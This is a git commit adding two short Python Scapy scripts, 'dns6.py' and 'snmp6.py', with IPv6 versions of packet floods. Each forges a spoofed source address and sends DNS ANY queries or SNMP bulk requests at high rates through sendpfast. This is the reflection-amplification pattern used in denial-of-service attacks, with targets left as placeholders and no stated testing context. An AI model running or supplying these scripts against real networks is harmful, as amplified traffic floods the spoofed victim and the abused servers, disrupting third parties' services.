b0720a11f7b6f5fb7601c91f9725ce318ab3e663
Theo Baschak <theodore@ciscodude.net>
2014-02-23 01:13:15 -0600

    add ipv6 versions

---
+++ dns6.py
@@ -0,0 +1,8 @@
+from scapy.all import *
+fakesrc = 'x.x.x.x'
+server = 'x.x.x.x'
+device = 'xxx'
+
+mypacket = IPv6(dst=server, src=fakesrc)/UDP(dport=53, sport=8000)/DNS(qd=DNSQR(qname="isc.org", qtype="ANY"))
+l2packet = Ether()/mypacket
+sendpfast( l2packet*10000, pps=2500, loop=10, iface=device, file_cache=True )
---
+++ snmp6.py
@@ -0,0 +1,11 @@
+from scapy.all import *
+fakesrc = 'x.x.x.x'
+server = 'x.x.x.x'
+device = 'xxx'
+snmpver = 'v2c'
+snmpcomm = 'public'
+
+mypacket = IPv6(src=fakesrc, dst=server)/UDP(sport=161, dport=161)/SNMP(version=snmpver, community=snmpcomm, PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=10,varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.9.1.3')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.9.1.3')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.9.1.3'))]))
+l2packet = Ether()/mypacket
+
+sendpfast( l2packet*2500, pps=2500, loop=100, iface=device, file_cache=True )
